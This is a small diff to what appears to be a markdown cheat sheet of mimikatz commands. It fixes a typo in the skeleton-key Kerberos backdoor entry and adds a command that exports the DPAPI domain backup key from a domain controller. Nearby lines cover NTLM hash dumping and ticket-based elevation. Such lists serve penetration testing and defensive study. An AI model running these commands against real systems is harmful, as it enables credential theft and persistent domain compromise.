@@ -20,6 +20,8 @@
 
 ### misc::cmd = Elevates command prompt with the given ticket
 
-### misc::skeleton = Skeleton keyu (Kerberos Backdoor) (Default credentials: mimikatz)
+### misc::skeleton = Skeleton key (Kerberos Backdoor) (Default credentials: mimikatz)
 
 ### lsadump::lsa /patch = NTLM hashes dump
+
+### lsadump::backupkeys /system:localhost /export (Exports DPAPI Domain Backup Key from Domain Controller. VERY IMPORTANT!!!!)
